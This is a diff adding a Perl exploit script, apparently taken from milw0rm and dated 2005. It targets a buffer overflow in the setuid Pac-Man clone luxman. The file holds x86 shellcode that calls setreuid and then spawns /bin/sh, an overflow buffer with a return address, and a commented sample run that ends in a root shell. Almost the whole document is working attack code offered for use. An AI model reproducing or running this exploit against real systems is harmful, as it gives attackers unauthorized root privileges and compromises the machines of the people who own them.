@@ -1,0 +1,49 @@
+#!/usr/bin/perl -w
+#
+# luxman exploit
+#
+# ii  luxman         0.41-19.1      Pac-Man clone (svgalib based)
+#
+# Tested with "security compat" set in /etc/vga/libvga.config on debian unstable 3.1
+#
+# kfinisterre@jdam:~$ ./luxman_ex.pl
+# LuxMan v0.41, Copyright (c) 1995 Frank McIngvale
+# LuxMan comes with ABSOLUTELY NO WARRANTY; see COPYING for details.
+# 
+# You must be the owner of the current console to use svgalib.
+# Not running in a graphics capable console,
+# and unable to find one.
+# Using SIS driver, 2048KB. Chiptype=8
+# svgalib 1.4.3
+# You must be the owner of the current console to use svgalib.
+# Not running in a graphics capable console,
+# and unable to find one.
+# svgalib: Failed to initialize mouse.
+# 
+# The frame rate is now set to 1 frames per second.
+# If the game seems too fast, too slow, or too jerky,
+# you can adjust this value the `-r' option.
+# 
+# Calibrating delay...-664257
+# Sound server started [pid:7082]
+# sh-2.05b# id
+# uid=0(root) gid=1000(kfinisterre) groups=1000(kfinisterre)
+#
+
+($offset) = @ARGV,$offset || ($offset = 0);
+
+$sc  = "\x90"x512;
+$sc .= "\x31\xd2\x31\xc9\x31\xdb\x31\xc0\xb0\xa4\xcd\x80";
+$sc .= "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b";
+$sc .= "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd";
+$sc .= "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+$ENV{"FOO"} = $sc;
+
+$buf = "A" x 8732;
+$buf .= (pack("l",(0xbfffffff-512+$offset)) x2);
+
+#exec("strace -u kfinisterre /usr/games/luxman -r 1 -f $buf");
+exec("/usr/games/luxman -r 1 -f $buf");
+
+# milw0rm.com [2005-03-14]
